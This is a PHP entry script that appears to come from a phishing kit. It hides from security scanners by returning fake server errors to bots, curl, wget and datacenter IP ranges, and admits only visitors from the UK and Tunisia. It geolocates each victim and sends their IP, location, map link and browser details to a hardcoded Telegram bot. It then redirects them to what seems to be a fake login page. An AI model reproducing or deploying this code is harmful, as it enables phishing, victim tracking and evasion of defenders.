<?php
// === CONFIGURATION ===
$botToken = '8134569625:AAG7bzuQM6wlzjzLfaFCVFPbuJ4qQQUTt6s';
$chatId = '-4932499123';
$redirectTo = 'steps/login.html';
$bannedFile = __DIR__ . '/banned_ips.txt';

// === GET IP ===
function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    return $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
}
$ip = getUserIP();

// === BOT TRAPS (User-Agent + IP Range) ===
$ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
$bot_keywords = ['bot', 'crawl', 'spider', 'scanner', 'curl', 'wget', 'python', 'libwww', 'java', 'node'];
$dc_prefixes = ['34.', '35.', '104.', '185.', '192.', '198.'];

foreach ($bot_keywords as $kw) {
    if (strpos($ua, $kw) !== false) {
        http_response_code(500);
        exit('<h1>500 Server Error</h1>');
    }
}
foreach ($dc_prefixes as $prefix) {
    if (strpos($ip, $prefix) === 0) {
        http_response_code(500);
        exit('<h1>500 Server Error</h1>');
    }
}

// === CHECK BANNED IP FILE ===
if (file_exists($bannedFile)) {
    $banned = file($bannedFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (in_array($ip, $banned)) {
        http_response_code(403);
        exit("Access denied.");
    }
}

// === GEO CHECK (UK + TUNISIA ONLY) ===
$geo = @json_decode(file_get_contents("http://ip-api.com/json/$ip?fields=status,country,countryCode,regionName,city,lat,lon"));
$country = $geo->country ?? 'Unknown';
$code = $geo->countryCode ?? 'XX';
$region = $geo->regionName ?? 'Unknown';
$city = $geo->city ?? 'Unknown';
$lat = $geo->lat ?? '';
$lon = $geo->lon ?? '';
$mapLink = ($lat && $lon) ? "https://maps.google.com/?q=$lat,$lon" : 'Unavailable';

if (!in_array($code, ['TN', 'GB'])) {
    http_response_code(403);
    exit("Access denied.");
}

// === TELEGRAM LOGGING ===
$time = date("Y-m-d H:i:s");
$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$referer = $_SERVER['HTTP_REFERER'] ?? 'Direct';

$msg = "📥 <b>New Visitor (index.php)</b>\n"
     . "🕒 <b>Time:</b> $time\n"
     . "🌐 <b>IP:</b> <code>$ip</code>\n"
     . "📍 <b>Country:</b> $country ($code)\n"
     . "🏙️ <b>City:</b> $city\n"
     . "📶 <b>Region:</b> $region\n"
     . "🗺️ <b>Map:</b> $mapLink\n"
     . "🧭 <b>Referer:</b> $referer\n"
     . "📱 <b>UA:</b> $ua";

file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?" . http_build_query([
    'chat_id' => $chatId,
    'text' => $msg,
    'parse_mode' => 'HTML'
]));

// === REDIRECT IF CLEAN ===
header("Location: $redirectTo");
exit;
?>
